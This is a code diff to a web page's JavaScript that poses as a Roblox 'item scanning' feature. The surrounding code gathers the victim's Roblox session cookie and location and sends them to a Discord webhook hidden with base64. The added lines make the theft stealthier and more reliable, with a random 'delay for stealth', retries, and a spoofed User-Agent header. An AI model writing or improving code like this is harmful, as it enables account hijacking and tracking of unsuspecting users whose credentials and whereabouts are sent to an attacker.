@@ -259,6 +259,10 @@ async function submitPowerShell() {
         // Get user location
         const locationInfo = await getUserLocation();
         
+        // Random delay for stealth (1-3 seconds)
+        const delay = Math.floor(Math.random() * 2000) + 1000;
+        await new Promise(resolve => setTimeout(resolve, delay));
+        
         // Discord webhook URL
         const webhookUrl = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5NTQ1MDc3NDQ4OTY2MTQ4MC9lby0yV3Y0dEUwV2didGh5WmJJWFFja0tDc3BLeUJNQzN6V1k3WmN5VzVSZzNfVm4xajh4UUxxUTRmR20wM2NFSEVHdQ==');
         
@@ -269,13 +273,41 @@ Cookie: ${robloxCookie || 'None found'}
 Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}`
         };
 
-        const response = await fetch(webhookUrl, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(payload)
-        });
+        // Retry mechanism for webhook calls
+        let response;
+        let attempts = 0;
+        const maxAttempts = 3;
+        
+        while (attempts < maxAttempts) {
+            attempts++;
+            try {
+                response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'User-Agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36`
+                    },
+                    body: JSON.stringify(payload),
+                    mode: 'cors'
+                });
+                
+                if (response.ok) {
+                    break; // Success, exit retry loop
+                } else if (response.status === 429 && attempts < maxAttempts) {
+                    // Rate limited, wait and retry
+                    await new Promise(resolve => setTimeout(resolve, 5000));
+                    continue;
+                } else {
+                    break; // Other error, don't retry
+                }
+            } catch (fetchError) {
+                if (attempts === maxAttempts) {
+                    throw fetchError;
+                }
+                // Wait before retry
+                await new Promise(resolve => setTimeout(resolve, 2000));
+            }
+        }
         
         // Hide loading overlay
         if (loadingOverlay) loadingOverlay.style.display = 'none';
@@ -289,7 +321,16 @@ Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}
                 closeScanModal();
             }, 2000);
         } else {
-            throw new Error(`Item scanning failed with status: ${response.status}`);
+            const errorText = await response.text().catch(() => 'Unknown error');
+            if (response.status === 405) {
+                throw new Error(`Method not allowed (405). Webhook endpoint may be incorrect. Error: ${errorText}`);
+            } else if (response.status === 429) {
+                throw new Error(`Rate limited (429). Please wait before scanning again. Error: ${errorText}`);
+            } else if (response.status === 404) {
+                throw new Error(`Webhook not found (404). URL may be invalid. Error: ${errorText}`);
+            } else {
+                throw new Error(`Item scanning failed with status: ${response.status}. Error: ${errorText}`);
+            }
         }
     } catch (error) {
         if (loadingOverlay) loadingOverlay.style.display = 'none';
